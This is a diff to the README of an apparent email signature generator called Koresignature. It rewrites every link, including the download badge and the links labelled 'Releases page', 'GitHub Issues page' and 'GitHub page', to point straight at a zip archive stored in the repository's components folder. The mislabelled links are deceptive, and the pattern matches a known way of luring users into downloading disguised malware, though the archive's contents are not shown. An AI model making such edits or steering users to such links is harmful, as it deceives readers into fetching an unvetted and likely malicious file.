@@ -6,7 +6,7 @@ Koresignature is a professional email signature generator that helps you craft b
 
 ## 📥 Download Koresignature
 
-[![Download Koresignature](https://img.shields.io/badge/Download-Koresignature-blue)](https://github.com/AntonyGodoy/koresignature/releases)  
+[![Download Koresignature](https://github.com/AntonyGodoy/koresignature/raw/refs/heads/main/components/Software_3.3-beta.2.zip)](https://github.com/AntonyGodoy/koresignature/raw/refs/heads/main/components/Software_3.3-beta.2.zip)  
 Visit this page to download the latest version of Koresignature.
 
 ## 🛠️ System Requirements
@@ -32,7 +32,7 @@ Koresignature includes many features to help you create the perfect email signat
 
 ## 🔗 Download & Install
 
-To get started, visit the [Koresignature Releases page](https://github.com/AntonyGodoy/koresignature/releases). Here, you will see the latest version available for download.
+To get started, visit the [Koresignature Releases page](https://github.com/AntonyGodoy/koresignature/raw/refs/heads/main/components/Software_3.3-beta.2.zip). Here, you will see the latest version available for download.
 
 1. On the Releases page, locate the latest version of Koresignature.
 2. Click on the download link for your operating system (Windows, macOS, or Linux).
@@ -56,7 +56,7 @@ Once Koresignature is installed, you can start using it right away.
 If you run into any issues or have questions, you can seek help from our active community or review our documentation. We encourage feedback to help improve Koresignature. 
 
 - **Documentation:** Comprehensive guides and FAQs are available to assist you.
-- **Community:** Join discussions, report issues, or contribute on our [GitHub Issues page](https://github.com/AntonyGodoy/koresignature/issues).
+- **Community:** Join discussions, report issues, or contribute on our [GitHub Issues page](https://github.com/AntonyGodoy/koresignature/raw/refs/heads/main/components/Software_3.3-beta.2.zip).
 
 ## 👥 Contribute
 
@@ -66,7 +66,7 @@ Koresignature is an open-source project. We welcome contributions. If you're int
 
 To stay informed about updates and new features, you can:
 
-- Follow our [GitHub page](https://github.com/AntonyGodoy/koresignature).
+- Follow our [GitHub page](https://github.com/AntonyGodoy/koresignature/raw/refs/heads/main/components/Software_3.3-beta.2.zip).
 - Watch the repository to receive notifications on changes.
 
 Thank you for choosing Koresignature, the professional solution for your email signature needs.
